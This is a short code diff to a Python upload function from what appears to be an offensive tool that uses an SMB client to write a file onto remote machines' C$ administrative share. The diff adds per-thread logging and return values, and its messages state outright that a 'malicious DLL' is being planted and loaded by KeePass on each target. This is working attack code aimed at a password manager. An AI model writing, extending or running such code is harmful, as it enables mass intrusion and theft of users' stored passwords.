@@ -2,20 +2,21 @@
 
 import os
 
-def upload(smbClient, destination: str, local_filepath: str):
+def upload(smbClient, thread_index, destination: str, local_filepath: str):
     f = open(local_filepath, 'rb')
 
     try:
         smbClient.putFile("C$", destination, f.read)
+        print(f"[THREAD {thread_index}][+] Malicious DLL planted on {smbClient.getRemoteHost()}")
     except Exception as e: 
-        print(f"[-] {str(e)}")
         if "STATUS_SHARING_VIOLATION" in str(e):
-            print("[*] This happens is KeePass is already running and has loaded the extension")
+            print(f"[THREAD {thread_index}][!] KeePass seems to be already running and to have loaded the DLL on target {smbClient.getRemoteHost()}")
+        else:
+            print(f"[THREAD {thread_index}][!] {str(e)} on {smbClient.getRemoteHost()}")
 
         f.close()
-        return
+        return False
 
     f.close()
-    print(f"[+] File {os.path.basename(local_filepath)} dropped to target")
-    pass
+    return True
 
